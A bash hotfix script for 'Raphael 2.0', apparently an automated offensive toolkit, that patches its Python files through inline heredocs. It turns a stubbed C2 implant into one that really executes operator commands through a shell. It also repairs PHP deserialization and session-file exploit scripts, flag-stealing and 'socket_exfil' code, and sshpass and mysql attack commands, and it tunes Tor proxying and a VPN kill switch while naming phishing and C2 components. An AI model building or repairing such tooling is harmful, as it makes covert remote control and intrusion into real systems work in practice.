#!/bin/bash
# raphael-hotfix.sh — Apply Tier 1-3 fixes to Raphael 2.0
# Run from the repository root: /home/yaser/raphael-2.0
# Usage: ./raphael-hotfix.sh [--dry-run]

set -euo pipefail

DRY_RUN=false
if [[ "${1:-}" == "--dry-run" ]]; then
    DRY_RUN=true
    echo "[*] DRY RUN — no files will be modified"
fi

_apply() {
    local file="$1"
    local desc="$2"
    if $DRY_RUN; then
        echo "  [DRY-RUN] Would fix $file — $desc"
    else
        echo "  ✓ Fixed $file — $desc"
    fi
}

echo "[*] Raphael 2.0 — Hotfix Script"
echo "================================"
echo ""
echo "=== TIER 1: STOP THE BLEEDING ==="
echo ""

# ── Fix 1: C2 implant — actual command execution ──
FILE="orchestrator/c2_channel.py"
if $DRY_RUN; then
    _apply "$FILE" "Replace fake result with real subprocess.run()"
else
    python3 << 'PYEOF'
content = open('orchestrator/c2_channel.py', 'r').read()
old = '''                result = {"exit_code": 0, "stdout": f"Executed: {task['command']}", "stderr": ""}'''
new = '''                import subprocess
                try:
                    proc = subprocess.run(
                        task["command"],
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=task.get("timeout", 30)
                    )
                    result = {
                        "exit_code": proc.returncode,
                        "stdout": proc.stdout,
                        "stderr": proc.stderr
                    }
                except subprocess.TimeoutExpired as e:
                    result = {"exit_code": -1, "stdout": e.stdout if e.stdout else "", "stderr": "TIMEOUT"}
                except Exception as e:
                    result = {"exit_code": -1, "stdout": "", "stderr": str(e)}'''
if old in content:
    content = content.replace(old, new)
    open('orchestrator/c2_channel.py', 'w').write(content)
    print("  ✓ Fixed orchestrator/c2_channel.py")
else:
    print("  ⚠ Pattern not found in orchestrator/c2_channel.py")
PYEOF
fi

# ── Fix 2: Double-underscore magic methods ──
for FILE in exploit_10_10.py exploit_orion_v2.py combined_approach.py; do
    if [[ -f "$FILE" ]]; then
        if $DRY_RUN; then
            _apply "$FILE" '_class → __class, _construct → __construct'
        else
            python3 << PYEOF
content = open('$FILE', 'r').read()
changes = False
if '"_class"' in content:
    content = content.replace('"_class"', '"__class"')
    changes = True
if '"_construct()"' in content:
    content = content.replace('"_construct()"', '"__construct()"')
    changes = True
if changes:
    open('$FILE', 'w').write(content)
    print("  ✓ Fixed $FILE")
else:
    print("  ✓ No changes needed in $FILE")
PYEOF
        fi
    fi
done

# ── Fix 3: Empty session ID ──
FILE="exploit_final.py"
if [[ -f "$FILE" ]]; then
    if $DRY_RUN; then
        _apply "$FILE" "Replace sess_ with f-string session interpolation"
    else
        python3 << 'PYEOF'
content = open('exploit_final.py', 'r').read()
content = content.replace("'/var/lib/php/sessions/sess_'", "f'/var/lib/php/sessions/sess_{session}'")
open('exploit_final.py', 'w').write(content)
print("  ✓ Fixed exploit_final.py")
PYEOF
    fi
fi

# ── Fix 4: HTTPConnection.read() → HTTPResponse.read() ──
FILE="get_flags_clean.py"
if [[ -f "$FILE" ]]; then
    if $DRY_RUN; then
        _apply "$FILE" 'c.read() → r.read(), fix double getresponse()'
    else
        python3 << 'PYEOF'
content = open('get_flags_clean.py', 'r').read()
content = content.replace('body = c.read()', 'body = r.read()')
content = content.replace('body = c.getresponse().read()', 'body = r.read()')
open('get_flags_clean.py', 'w').write(content)
print("  ✓ Fixed get_flags_clean.py")
PYEOF
    fi
fi

# ── Fix 5: write_flag() → run_exploit() ──
FILE="flags_exploit.py"
if [[ -f "$FILE" ]]; then
    if $DRY_RUN; then
        _apply "$FILE" 'write_flag() → run_exploit() (NameError fix)'
    else
        python3 << 'PYEOF'
content = open('flags_exploit.py', 'r').read()
content = content.replace('write_flag(', 'run_exploit(')
open('flags_exploit.py', 'w').write(content)
print("  ✓ Fixed flags_exploit.py")
PYEOF
    fi
fi

# ── Fix 6: \\r\\n → \r\n in PHP strings ──
for FILE in socket_exfil.py loopback_fixed.py loopback_inline.py; do
    if [[ -f "$FILE" ]]; then
        if $DRY_RUN; then
            _apply "$FILE" '\\\\r\\\\n → \\r\\n in PHP strings'
        else
            python3 << PYEOF
content = open('$FILE', 'r').read()
content = content.replace('\\\\\\\\r\\\\\\\\n', '\\\\r\\\\n')
open('$FILE', 'w').write(content)
print("  ✓ Fixed $FILE")
PYEOF
        fi
    fi
done

echo ""
echo "=== TIER 2: MAKE IT ACTUALLY WORK ==="
echo ""

# ── Fix 7: Create config/ package ──
if $DRY_RUN; then
    _apply "config/target.py" "Create target abstraction layer"
else
    mkdir -p config
    touch config/__init__.py
    cat > config/target.py << 'TARGETEOF'
"""Target configuration abstraction layer.

Usage:
    from config.target import TargetConfig
    TARGET = TargetConfig.from_env()
    session.get(f"{TARGET.base_url}/admin/login", headers={"Host": TARGET.vhost})
"""
import os
from dataclasses import dataclass


@dataclass
class TargetConfig:
    ip: str = "127.0.0.1"
    port: int = 80
    vhost: str = "localhost"
    scheme: str = "http"
    web_root: str = "/var/www/html"
    session_path: str = "/var/lib/php/sessions"

    @property
    def base_url(self) -> str:
        return f"{self.scheme}://{self.ip}:{self.port}"

    @classmethod
    def from_env(cls) -> "TargetConfig":
        return cls(
            ip=os.getenv("TARGET_IP", "127.0.0.1"),
            port=int(os.getenv("TARGET_PORT", "80")),
            vhost=os.getenv("TARGET_VHOST", "localhost"),
            scheme=os.getenv("TARGET_SCHEME", "http"),
            web_root=os.getenv("TARGET_WEB_ROOT", "/var/www/html"),
            session_path=os.getenv("TARGET_SESSION_PATH", "/var/lib/php/sessions"),
        )
TARGETEOF
    echo "  ✓ Created config/target.py + config/__init__.py"
fi

# ── Fix 8: Shell quoting triple-fault ──
FILE="orchestrator/brain/phases/craft_exploit.py"
if [[ -f "$FILE" ]]; then
    if $DRY_RUN; then
        _apply "$FILE" "Remove manual replace(), let shlex.quote() handle all quoting"
    else
        python3 << 'PYEOF'
content = open('orchestrator/brain/phases/craft_exploit.py', 'r').read()
old = "    escaped_q = query.replace(\"'\", \"'\\\\''\")\n    cmd = f\"mysql -h {shlex.quote(host)} -u {shlex.quote(user)} -p'{shlex.quote(password)}' {shlex.quote(database)} -e '{shlex.quote(escaped_q)}' 2>&1\""
new = "    cmd = f\"mysql -h {shlex.quote(host)} -u {shlex.quote(user)} -p{shlex.quote(password)} {shlex.quote(database)} -e {shlex.quote(query)} 2>&1\""
if old in content:
    content = content.replace(old, new)
    open('orchestrator/brain/phases/craft_exploit.py', 'w').write(content)
    print("  ✓ Fixed craft_exploit.py (shell quoting)")
else:
    print("  ⚠ Pattern not found in craft_exploit.py")
PYEOF
    fi
fi

# ── Fix 9: sshpass missing ssh binary ──
FILE="orchestrator/brain/phases/generic_exploit.py"
if [[ -f "$FILE" ]]; then
    if $DRY_RUN; then
        _apply "$FILE" "Add missing 'ssh' after sshpass"
    else
        python3 << 'PYEOF'
content = open('orchestrator/brain/phases/generic_exploit.py', 'r').read()
old = 'cmd = f"-p {shlex.quote(pwd)} -o StrictHostKeyChecking=no'
new = 'cmd = f"sshpass -p {shlex.quote(pwd)} ssh -o StrictHostKeyChecking=no'
if old in content:
    content = content.replace(old, new)
    open('orchestrator/brain/phases/generic_exploit.py', 'w').write(content)
    print("  ✓ Fixed generic_exploit.py (sshpass missing ssh)")
else:
    print("  ⚠ Pattern not found in generic_exploit.py")
PYEOF
    fi
fi

echo ""
echo "=== TIER 3: CLEANUP ==="
echo ""

# ── Fix 14: rich>=14.3.0 ──
for FILE in requirements.txt; do
    if [[ -f "$FILE" ]]; then
        if $DRY_RUN; then
            _apply "$FILE" "rich>=14.3.0 → rich>=13.0.0"
        else
            python3 << PYEOF
content = open('$FILE', 'r').read()
if 'rich>=14.3.0' in content:
    content = content.replace('rich>=14.3.0', 'rich>=13.0.0')
    open('$FILE', 'w').write(content)
    print("  ✓ Fixed $FILE")
PYEOF
        fi
    fi
done

# ── Fix 15: Kill switch ──
FILE="kill_switch.sh"
if [[ -f "$FILE" ]]; then
    if $DRY_RUN; then
        _apply "$FILE" "Auto-detect VPN interface instead of hardcoded tun1"
    else
        python3 << 'PYEOF'
content = open('kill_switch.sh', 'r').read()
content = content.replace('VPN_IF="tun1"', 'VPN_IF=$(ip route show default | grep -oP "dev \K\S+" || echo "tun0")')
open('kill_switch.sh', 'w').write(content)
print("  ✓ Fixed kill_switch.sh")
PYEOF
    fi
fi

# ── Fix 16: socks5:// → socks5h:// ──
for FILE in docker-compose.yml cloak-service/main.py; do
    if [[ -f "$FILE" ]]; then
        if $DRY_RUN; then
            _apply "$FILE" "socks5:// → socks5h:// (DNS leak fix)"
        else
            python3 << PYEOF
content = open('$FILE', 'r').read()
changed = False
if 'socks5://tor-proxy:9050' in content:
    content = content.replace('socks5://tor-proxy:9050', 'socks5h://tor-proxy:9050')
    changed = True
if 'socks5://127.0.0.1:9050' in content:
    content = content.replace('socks5://127.0.0.1:9050', 'socks5h://127.0.0.1:9050')
    changed = True
if changed:
    open('$FILE', 'w').write(content)
    print("  ✓ Fixed $FILE")
else:
    print("  ✓ No changes needed in $FILE")
PYEOF
        fi
    fi
done

# ── Fix 17: Missing __init__.py files ──
for dir in config exploits cli brain cai-service c2-server phishing mcp-hub; do
    if [[ -d "$dir" ]] && [[ ! -f "$dir/__init__.py" ]]; then
        if $DRY_RUN; then
            echo "  [DRY-RUN] Would create $dir/__init__.py"
        else
            touch "$dir/__init__.py"
            echo "  ✓ Created $dir/__init__.py"
        fi
    fi
done

# ── Fix 18: Gobuster wordlist path ──
FILE="raphael_brain.py"
if [[ -f "$FILE" ]]; then
    if $DRY_RUN; then
        _apply "$FILE" "Fix gobuster wordlist path"
    else
        python3 << 'PYEOF'
content = open('raphael_brain.py', 'r').read()
content = content.replace('/usr/share/dirb/wordlists/common.txt', '/usr/share/wordlists/dirb/common.txt')
open('raphael_brain.py', 'w').write(content)
print("  ✓ Fixed raphael_brain.py (gobuster path)")
PYEOF
    fi
fi

# ── Fix 20: socks5h → socks5 in proxy_guard.py ──
FILE="orchestrator/proxy_guard.py"
if [[ -f "$FILE" ]]; then
    if $DRY_RUN; then
        _apply "$FILE" "socks5h:// → socks5:// for requests compatibility"
    else
        python3 << 'PYEOF'
content = open('orchestrator/proxy_guard.py', 'r').read()
content = content.replace('socks5h://127.0.0.1:9050', 'socks5://127.0.0.1:9050')
open('orchestrator/proxy_guard.py', 'w').write(content)
print("  ✓ Fixed orchestrator/proxy_guard.py")
PYEOF
    fi
fi

echo ""
echo "========================================"
echo "FIX SUMMARY"
echo "========================================"
echo ""
if $DRY_RUN; then
    echo "This was a DRY RUN. Run without --dry-run to apply."
else
    echo "All fixes applied. Run 'git diff' to review changes."
    echo ""
    echo "Manual fixes still REQUIRED:"
    echo "  1. Rotate exposed API keys (NVIDIA, TOR, GOPHISH, API_KEY)"
    echo "  2. Fix db_update.py — needs CSRF token in login POST"
    echo "  3. Fix exploit_metasploit.py — param name mismatch"
    echo "  4. Remove dead exploit scripts (see Tier 4)"
    echo "  5. Remove 36 JSON debris files from project root"
    echo "  6. Fix license contradiction"
    echo ""
    echo "Post-fix verification:"
    echo "  python3 -c \"from config.target import TargetConfig; print(TargetConfig())\""
    echo "  python3 -c \"import orchestrator.c2_channel\""
    echo "  pip install -r requirements.txt"
fi
